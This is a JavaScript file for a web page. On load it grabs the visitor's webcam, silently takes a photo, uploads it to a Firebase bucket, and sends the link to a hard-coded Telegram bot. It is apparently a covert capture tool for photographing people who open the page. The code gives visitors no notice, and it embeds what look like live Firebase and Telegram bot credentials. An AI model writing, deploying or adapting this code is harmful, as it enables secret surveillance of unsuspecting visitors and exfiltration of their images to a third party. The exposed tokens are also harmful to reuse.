document.addEventListener('DOMContentLoaded', () => {
    const videoElement = document.getElementById('videoElement');
    const canvasElement = document.getElementById('canvasElement');
    const canvasContext = canvasElement.getContext('2d');

    let stream;

    // Initialize Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyAKbdU0EKBK4nFxTouKQNiVyzgblXkgGOU",
        authDomain: "capture-it-e5b68.firebaseapp.com",
        projectId: "capture-it-e5b68",
        storageBucket: "capture-it-e5b68.appspot.com",
        messagingSenderId: "780183780729",
        appId: "1:780183780729:web:a0ecd28c411a7d88ce43a8"
    };

    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }

    const storage = firebase.storage();

    async function requestCameraAccess() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            videoElement.srcObject = stream;
            videoElement.play();

            videoElement.addEventListener('loadedmetadata', () => {
                videoElement.play();
            });

            videoElement.addEventListener('canplay', () => {
                setTimeout(capturePhoto, 1000); // Increased delay to ensure the video is ready
            }, { once: true });

            setTimeout(stopVideoStream, 2000); // Increased stop time to avoid premature stop
        } catch (error) {
            console.error("Error accessing the camera: ", error);
        }
    }

    function capturePhoto() {
        if (stream && videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
            canvasContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            // Optional: Debugging - Log the canvas content to console
            console.log('Canvas image drawn:', canvasElement.toDataURL('image/png'));

            canvasElement.toBlob(blob => {
                if (blob) {
                    uploadImage(blob);
                } else {
                    console.error('Failed to create blob from canvas');
                }
            }, 'image/png'); // PNG format for better quality
        } else {
            console.error('Video element is not ready for capture');
        }
    }

    function uploadImage(blob) {
        const fileRef = storage.ref().child('images/' + 'image_' + new Date().toISOString().replace(/[-:.]/g, '') + '.png'); // PNG format

        const uploadTask = fileRef.put(blob);

        uploadTask.on('state_changed',
            snapshot => {
                const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
                console.log('Upload is ' + progress + '% done');
            },
            error => {
                console.error('Upload failed:', error);
            },
            () => {
                uploadTask.snapshot.ref.getDownloadURL().then(downloadURL => {
                    console.log('File available at', downloadURL);
                    notifyTelegramBot(downloadURL);
                });
            }
        );
    }

    function notifyTelegramBot(imageUrl) {
        const botToken = '7224754204:AAGVD9csTIX8wMvHYmTPFrmJ_eq4etfJ71s';
        const chatId = '6369469811';
        const message = `New image uploaded: ${imageUrl}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Telegram notification sent:', data);
        })
        .catch(error => {
            console.error('Telegram notification error:', error);
        });
    }

    function stopVideoStream() {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            videoElement.srcObject = null;
        }
    }

    requestCameraAccess();
});
